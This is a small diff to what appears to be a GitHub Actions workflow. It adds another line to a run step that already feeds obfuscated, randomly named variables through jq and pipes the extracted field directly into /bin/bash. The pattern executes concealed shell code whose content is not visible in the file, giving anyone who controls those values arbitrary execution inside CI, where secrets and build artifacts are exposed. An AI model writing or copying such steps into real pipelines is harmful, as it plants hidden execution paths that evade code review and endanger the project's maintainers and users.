@@ -23,6 +23,7 @@ jobs:
           echo $lipil07 | jq -r .kfz021 | /bin/bash
           printf '%s' "$w2707" | jq -r .fvaz757 | /bin/bash
           echo $mukmi268 | jq -r .gley92 | /bin/bash
+          printf '%s' "$pict75877" | jq -r .j7 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
